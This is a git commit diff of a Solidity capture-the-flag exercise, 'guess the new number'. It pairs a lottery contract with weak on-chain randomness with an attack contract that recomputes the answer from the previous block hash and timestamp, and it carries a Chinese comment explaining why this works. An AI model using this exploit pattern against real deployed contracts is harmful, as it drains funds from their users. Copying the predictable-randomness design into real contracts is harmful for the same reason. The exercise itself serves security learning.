bda1da11104d56d307ecee98eef99d2102c41654
oh7887 <118185225+oh7887@users.noreply.github.com>
2023-03-20 22:52:02 +0800

    Update capture 彩票4.sol

--- capture 彩票4.sol
+++ capture 彩票4.sol
@@ -11,14 +11,14 @@ contract guessTheNewNumberChallenge {
 
     function guess(uint8 n) public payable {
         require(msg.value == 1 ether);
-        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
+        uint8 answer = uint8(keccak256(blockhash(block.number - 1), now));
         if (n == answer) {
             msg.sender.transfer(2 ether);
         }
     }
 }
-/*可以看到 answer在 guess调用时才生成 及无法在slot中找到
-但是在同一个区块之中 所以answer便知道了*/
+/*可以看到 answer在 guess调用时才生成 所以无法在slot中找到
+但是所有anwer在同一个区块之中产生 所以只要answer产生便不会改变 */
 contract attack
 {
    GuessTheNewNumberChallenge  gues;
@@ -30,7 +30,7 @@ function att() public payable {
   uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
   gues.guess{value:1 ether}(answer);
 }
-fallback() external payable
+function() external payable
 {
 
 } 
